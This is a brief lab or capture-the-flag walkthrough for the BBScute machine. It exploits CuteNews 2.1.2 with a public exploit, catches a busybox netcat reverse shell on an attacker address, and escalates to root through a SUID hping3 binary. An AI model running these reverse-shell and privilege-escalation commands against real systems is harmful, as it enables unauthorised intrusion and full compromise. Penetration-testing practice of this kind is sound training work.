# BBScute - Walkthrough

## 🧗 Initial Foothold

### 🌐 1. Web Recon on Port 80
- Discovered `index.php` hosted on port `80`.
- Identified the CMS: **CuteNews 2.1.2**

### 🐍 2. Exploit CMS
- Used `searchsploit` to find an exploit:
  - **Exploit ID:** 48800.py
- Modified a few lines in the script to match target setup:
  - Set the target URL:
    ```python
    url = "http://192.168.169.128/"
    ```
- Payload used:
  ```bash
  busybox nc 192.168.45.179 80 -e sh
  ```
- Set up listener on attack machine and received a basic shell.

---

## ⚙️ Privilege Escalation

### 🔍 1. Run `linpeas.sh`
- Found interesting SUID binary:
  ```
  /usr/sbin/hping3
  ```

### 🔧 2. Exploit hping3 for SUID Priv Esc
```bash
/usr/sbin/hping3
```

Once in the hping3 interactive prompt, run:
```bash
/!sh -p
```

- Spawned a root shell via the `-p` flag (preserves privileges).

---

## 🧠 Notes

- Classic example of CMS RCE → reverse shell → SUID binary → root.
- The `hping3` binary is commonly exploitable when marked as SUID.
